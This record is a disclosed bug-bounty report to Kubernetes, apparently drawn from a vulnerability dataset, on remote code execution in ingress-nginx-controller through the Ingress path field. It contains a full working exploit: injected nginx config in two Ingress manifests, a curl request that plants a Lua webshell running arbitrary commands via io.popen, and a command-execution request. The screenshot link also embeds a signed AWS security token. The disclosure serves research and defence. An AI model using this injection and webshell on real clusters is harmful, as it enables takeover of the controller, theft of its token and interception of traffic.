{
  "reported_to": "Kubernetes",
  "reported_by": "ginoah ",
  "title": "RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field",
  "content": "\nReport Submission Form\nSummary:\nA user with ingress create/update privilege may inject config into nginx.conf with path.\nConfig the log_format and access_log to write arbitrary file.\nInclude the file we created to bypass path sanitizer to RCE.\nKubernetes Version:\nCode 236 Bytes\n1serverVersion:\n2  buildDate: \"2022-03-06T21:32:53Z\"\n3  compiler: gc\n4  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a\n5  gitTreeState: clean\n6  gitVersion: v1.23.4\n7  goVersion: go1.17.7\n8  major: \"1\"\n9  minor: \"23\"\n10  platform: linux/amd64\nComponent Version:\nCode 359 Bytes\n1-------------------------------------------------------------------------------\n2NGINX Ingress controller\n3  Release:       v1.2.1\n4  Build:         08848d69e0c83992c89da18e70ea708752f21d7a\n5  Repository:    https://github.com/kubernetes/ingress-nginx\n6  nginx version: nginx/1.19.10\n7\n8-------------------------------------------------------------------------------\nSteps To Reproduce:\nCreate a kind cluster config\nlab.yaml\nCode 467 Bytes\n1kind: Cluster\n2name: lab\n3apiVersion: kind.x-k8s.io/v1alpha4\n4nodes:\n5# the control plane node config\n6- role: control-plane\n7  kubeadmConfigPatches:\n8  - |\n9    kind: InitConfiguration\n10    nodeRegistration:\n11      kubeletExtraArgs:\n12        node-labels: \"ingress-ready=true\"\n13  extraPortMappings:\n14  - containerPort: 80\n15    hostPort: 80\n16    protocol: TCP\n17  - containerPort: 443\n18    hostPort: 443\n19    protocol: TCP\n20# the three workers\n21- role: worker\n22- role: worker\n23- role: worker\nCreate a testing cluster with the previous config\nCode 37 Bytes\n1kind create cluster --config lab.yaml\nInstall nginx-ingress-controller\nCode 120 Bytes\n1kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml\nCreate a the first malicious ingress\nThis ingress will allow attacker to write arbitrary content to arbitrary file.\n(note that the service not-exist-service does not need to exist)\nwrite_ingress.yaml\nCode 666 Bytes\n1apiVersion: networking.k8s.io/v1\n2kind: Ingress\n3metadata:\n4  name: webexp\n5spec:\n6  rules:\n7    - host: \"example.com\"\n8      http:\n9        paths:\n10          - path: \"/x/ {\\n\n11            }\\n\n12          }\\n\n13          log_format exploit escape=none $http_x_ginoah;\\n\n14          server {\\n\n15            server_name x.x;\\n\n16            listen 80;\\n\n17            listen [::]:80;\\n\n18            location /z/ {\\n\n19                access_log /tmp/luashell exploit;\\n\n20            }\\n\n21            location /x/ {\\n\n22          #\"\n23            pathType: Exact\n24            backend:\n25              service:\n26                name: not-exist-service\n27                port:\n28                  number: 8080\nApply the first malicious ingress config\nCode 35 Bytes\n1kubectl apply -f write_ingress.yaml\nWrite a malicious lua config to /tmp/luashell\nNote that in other cluster config, the localhost may need to change to ingress-controller's ip.\nCode 263 Bytes\n1curl localhost/z/ -H \"host: x.x\" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args[\"cmd\"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read(\"*a\");ngx.say(string.format(\"%s\", ret));end;}'\nCreate a the second malicious ingress\nThis ingress will include the malicious lua config, which allow attack to execute arbitrary command.\nwebshell_ingress.yaml\nCode 655 Bytes\n1apiVersion: networking.k8s.io/v1\n2kind: Ingress\n3metadata:\n4  name: webexp\n5spec:\n6  rules:\n7    - host: \"example.com\"\n8      http:\n9        paths:\n10          - path: \"/x/ {\\n\n11            }\\n\n12          }\\n\n13          log_format exploit escape=none $http_x_ginoah;\\n\n14          server {\\n\n15            server_name x.x;\\n\n16            listen 80;\\n\n17            listen [::]:80;\\n\n18            location /z/ {\\n\n19                include /tmp/luashell;\\n\n20            }\\n\n21            location /x/ {\\n\n22          #\"\n23            pathType: Exact\n24            backend:\n25              service:\n26                name: not-exist-service\n27                port:\n28                  number: 8080\nApply the second malicious ingress config\nCode 38 Bytes\n1kubectl apply -f webshell_ingress.yaml\nRCE and get output\nCode 44 Bytes\n1curl localhost/z/ -H \"host: x.x\" -d \"cmd=id\"\nSupporting Material/References:\n[attachment / reference]\n<image_0>\nImpact\nA cluster user/SA with ingress create/update privilege may Remote Code Execution on ingress-nginx-controller pod\nAfter RCE on ingress-nginx-controller the attacker may\nutilize the token to take further action on cluster with ingress's privilege\neavesdrop the traffic, modify other ingress rule\nDOS\n...\n\n",
  "severity": [
    8.8,
    null
  ],
  "bounty": 2500,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/feuyy84f9a9k05e2qq5bd1dxa986?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-06-30_at_10.22.52_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-06-30_at_10.22.52_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXJGZE35P%2F20250324%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250324T230048Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgDmyUlQ%2FZK1l2L7iuvNkmZ7SLGftPBhWAealaAQAZlAiEA3zyUKwX8U3Oxw5ml9tl5CoO7146tV3otxKWiQkeRSRoquwUI8%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDM1SaM1Z3Bftvp8y1yqPBSYYeDFlqPSz5ki%2BPhBiT7aDVwSsdNfp4d%2B1joy3GFboMUknHP5bR7LxpHLuxkOQLISX6Zi9X%2BCGU3pQDK2UmKLyF1ayfJ2r98NygFesgyd6cUi%2BnteQuq8fOyGvX9ghO2Ts6IBhdkr89ed647eGImtSYYl%2B6jIjueli0McQe%2F0LYObrcGGmEEY7Gmls7B55%2BAlt2ccKlBFxLCvzFqUGgjynIJRzmOFWxz8%2Bbe69SzSdNO66IZcGtwnenwYNwkuv4tlBmKx3DKCK27XYu8BcjpBdZvbtymPDeHTnldI5jfOzNhtpUtUZH8ijLb3hzLdnSd2pjVWFvcagH%2FVT7B%2BIdgnHIbfcEVbmRPEUCwp35Cj3Cm5ii0ryH381dplOHxwpmvEa%2BW8D8ycCvWsnSfCJDvfIFTHBYo9yZbJ%2BUZJWLUgdvF22%2Fh%2B%2BO%2BTOlmrh1y0Ks0aEjeXGjBBWbcDK7YmYPGTELVsi%2F2NzDGpC1zgQ9ql6Kq2BmujZaNi5PwgP8dwcCsN3zxB6JacVBBfjrwTKIBoUfKe2CKLHjfNszj3Qyp6diObgnjQ%2BB52hKfV%2FjeG5EM%2F3E59u9omvgnXJTAPWytiZTrD%2FOjo%2Fkm%2FXMMXp6%2B%2BcQQaMW9v0ppD%2FGh4VwC6yBulCsm69UkmGA57VYG2oD%2FpvS9Kj5ZRDZrayzC7ueA6YsfHn%2BiSiS7xq6FZLWa0crNgqDRMIOkFRKnzy7Qnyxr%2FFF96G1PYuCIOn4UhT3LENU8ddcjG68JxauRrLPoIa3zvF2Tx3F6xx53pHNinBwu6wxMZ7swFU4XRs835hmgHZ2T%2FWNdq%2BlUyBglTKG7qI8RN6X4ZT2tCQZ9IRnapo0v8RQNCCMmfml%2F7n%2ByHmtmowsbmGvwY6sQEGVJiOMAooI7F4F4M2dEwBh3xeLW5pnTadh%2B8nLCSHOQl4%2Ftm007SR3tO0UpKSk9BR8EJZC430uxa2uW1iczcVDnq0EegsyUwTHVXap6%2FiquYtG4QxE2nrvmChd6zxL9%2FgAbwmVppVu2tn2RVoUiFV5bbk591A%2Bnh689%2BRfcIABaNuGfz%2BeHg2OYoIP%2B5EnI5yFklD%2BFjZVTb3ijarNhTGjahK9mNgd8mdwrit%2FI5b%2Fy4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=34a1095c300bc970a17f38a87a0ba8adad9eec92c7eceec5ec920ddfad2bb31e"
  },
  "disclosed_date": 1698329220,
  "report_url": "https://hackerone.com/reports/1620702",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Create a kind cluster configuration and set up a testing environment with nginx-ingress-controller installed."
    ],
    [
      2,
      "Apply two malicious ingress configurations sequentially to exploit the vulnerability, first to write arbitrary content to a file, then to include this file for RCE."
    ]
  ],
  "vuln_description": "A user with ingress create/update privileges can inject malicious configurations into nginx.conf via the Ingress spec.rules.http.paths.path field. This allows writing arbitrary files and including them to bypass path sanitization, leading to Remote Code Execution (RCE) on the ingress-nginx-controller pod.",
  "reason": "The attack involves multiple components (ingress configurations, nginx.conf manipulation, file inclusion) and requires understanding of nginx configuration syntax and Kubernetes ingress behavior. The interaction between writing a file and then including it for RCE is non-obvious and requires precise manipulation of application states.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The vulnerability requires crafting specialized Ingress resources with embedded NGINX configuration syntax in the path field - a parameter not exposed through regular web navigation. The attack involves multi-stage Kubernetes API operations and out-of-band payload execution through log file inclusion, which doesn't align with the methodology's requirements of same-channel detection through regular user navigation. The injection vector exists in the cluster management plane rather than the application layer being monitored by the methodology.",
    "is_simple_injection": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves manipulating the ingress-nginx-controller's configuration through the Ingress resource, which is a Kubernetes-specific action and not directly related to HTTP request/response tuples or user sessions within a web application. The methodology described focuses on web application authentication and authorization boundaries, not Kubernetes RBAC or ingress controller configuration vulnerabilities.",
    "is_detectable": false
  }
}